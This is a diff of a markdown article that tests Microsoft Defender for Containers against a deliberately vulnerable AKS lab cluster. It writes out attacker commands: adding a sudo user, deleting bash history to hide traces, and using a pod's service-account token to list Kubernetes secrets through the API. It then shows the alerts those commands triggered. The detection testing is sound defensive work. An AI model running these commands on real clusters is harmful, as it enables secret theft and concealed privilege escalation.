@@ -274,29 +274,73 @@ sWE4Y1lCLqTdRjtYsuRshcdJj8soa9tKWwwDbiEPANLvuilsyRrwp0YpWwv2XhpjnpWl+gU= " >> ~/
 
 `useradd -g sudo Tux`
 
-- Downloading, installing and running MetaSploit (a known attacker framework with collection of exploits):
+- Lets' again delete our traces
 
-`curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
-  chmod 755 msfinstall && \
-  ./msfinstall`
-  
- `/opt`
+`rm -rf ~/.bash_history`
+
+### Targeting Kube API
+
+**Pod used:** Hunger Check
+**Pod properties:**
+- Secret reader RBAC role
+
+This pod has in fact extra-privileges being assigned. Indeed, a RBAC role 'secret reader' is assigned to the service account bind to this pod. Service accounts are identities in Kubernetes world, assigned to resources such as pods, which allows them to communicate with the Kube API, with certain privileges. 
+A good article on the subject and related threats can be found [here](https://techcommunity.microsoft.com/t5/microsoft-defender-for-cloud/detecting-identity-attacks-in-kubernetes/ba-p/3232340 ). 
+
+In this specific case, the deployment has overly permissive policy/access which allows us to gain access to other resources and services.
+
+![image](https://user-images.githubusercontent.com/18376283/156607828-fbd4dd88-5d02-4a01-872b-3dab51612b8a.png)
+
+As an attacker, I can use the service account token information and try to retrieve information from the Kube API:
+
+`export APISERVER=https://${KUBERNETES_SERVICE_HOST}
+export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
+export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
+export TOKEN=$(cat ${SERVICEACCOUNT}/token)
+export CACERT=${SERVICEACCOUNT}/ca.crt`
+
+I can then try to list secrets in the default namespace:
+
+![image](https://user-images.githubusercontent.com/18376283/156608451-f6b30669-3c32-414f-b555-a28a5fe31533.png)
+
+It does not work, as I am not in the default namespace. Indeed, the pod are running in *big-monolith* namespace:
+
+![image](https://user-images.githubusercontent.com/18376283/156608884-3ab21fba-4893-450f-a0bc-a6ca4d7d967a.png)
+
+But we can therefore use the correct namespace and run the following command to list secrets:
+
+`~curl --cacert ${CACERT} --header "Authorization: Bearer ${TOKEN}" -X GET ${APISERVER}/api/v1/namespaces/${NAMESPACE}/secrets`
+
+![image](https://user-images.githubusercontent.com/18376283/156610843-96d8321b-3919-4a00-9bc8-db5eaa6a9a47.png)
+
+### Looking at the alerts!
+
+Ok so we did a bunch of malicious operations in our environment and it would be good now to check if Defender for Cloud spotted something? We should of course first, in a real environment, have applied recommendations which we discussed earlier in this article, and enforced policies to avoid malicious operations from happening, but the idea was to test the alerting capability as well!
+
+If we go back to our Defender for Cloud panel, in the alerts section, we can see we triggered a bunch of alerts:
+Most of the scenarios we tested did trigger suspicious activities, next to the ones raised when we deployed Kubernetes Goat in our environment.
+
+![image](https://user-images.githubusercontent.com/18376283/156612095-00af5a18-a818-450b-8b50-f2713272b1d1.png)
+
+Let's look at two of them in more details:
+
+1. Detected suspicious use of the useradd command
+
+![image](https://user-images.githubusercontent.com/18376283/156613114-337c5711-19d0-42b6-8d04-bbf4a938265a.png)
+
+2. A file was downloaded and executed
+
+![image](https://user-images.githubusercontent.com/18376283/156613357-a6b29344-241d-4fee-9f5c-2fd1a31f13df.png)
 
 
+## Conclusion
 
+In this article we took a vulnerable AKS environment and looked at the capabilities of Defender for Containers including:
+- Vulnerability scanning (in registry and at runtime)
+- Policies enforcement and/or audit through usage of Azure Policy and Gatekeeper
+- Alerting and recommendations from Defender for Cloud on a vulnerable environment where malicious actions were triggered
 
-
-
-
-
-
-
-
-3. Starting the SSH server in the pod and adding a key to keep remote control
-
-
-2. 
-
+## References
 
 
 
